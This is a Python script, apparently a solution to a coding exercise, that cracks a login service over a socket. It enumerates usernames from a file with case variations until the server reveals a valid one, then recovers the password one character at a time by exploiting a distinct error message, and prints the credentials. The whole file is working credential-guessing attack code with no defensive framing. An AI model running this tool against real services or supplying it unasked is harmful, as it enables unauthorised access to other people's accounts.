import sys
import socket
import itertools
import json


def get_bruce_force():
    c = ''.join([chr(c) for c in range(97, 97 + 26)] + [str(c) for c in range(10)])
    pass_dict = []
    while True:
        pass_dict.append(c)
        for p in itertools.product(*pass_dict):
            yield ''.join(p)


def get_bruce_force_1ch():
    c = ''.join([chr(c) for c in range(97, 97 + 26)] + [str(c) for c in range(10)]
                + [chr(c) for c in range(65, 65 + 26)])
    pass_dict = []
    pass_dict.append(c)
    for p in itertools.product(*pass_dict):
        yield ''.join(p)


def get_pass_variations2(word):
    word_len = len(word)
    word_var = list(zip(word.lower(), word.upper()))
    word_var = [list(set(x)) for x in word_var]
    for v in itertools.product([0, 1], repeat=word_len):
        if any([len(word_var[x[0]]) < x[1] + 1 for x in enumerate(v)]):
            continue
        yield ''.join(c[1][v[c[0]]] for c in enumerate(word_var))


def get_dict_pass(p_file):
    for p in p_file:
        for pv in get_pass_variations2(p.strip()):
            yield pv


login = ''
password = ' '
pass_ok = 0


args = sys.argv
conn = socket.socket()
conn.connect((args[1], int(args[2])))

common_logins = open('logins.txt', 'r')
login_to_try_gen = get_dict_pass(common_logins)
while not login:
    login_to_try = next(login_to_try_gen)
    conn.send(f'{{"login": "{login_to_try}", "password": "{password}"}}'.encode())
    serv_resp = json.loads(conn.recv(1024).decode())
    if serv_resp['result'] == 'Wrong password!':
        login = login_to_try

common_logins.close()

password = ''
pass_to_try_gen = get_bruce_force_1ch()
while not pass_ok:
    pass_to_try = next(pass_to_try_gen)
    conn.send(f'{{"login": "{login}", "password": "{password + pass_to_try}"}}'.encode())
    serv_resp = json.loads(conn.recv(1024).decode())
    if serv_resp['result'] == 'Exception happened during login':
        password += pass_to_try
        pass_to_try_gen = get_bruce_force_1ch()
    elif serv_resp['result'] == 'Connection success!':
        pass_ok = 1
        password += pass_to_try


print(f'{{"login": "{login}", "password": "{password}"}}')
conn.close()
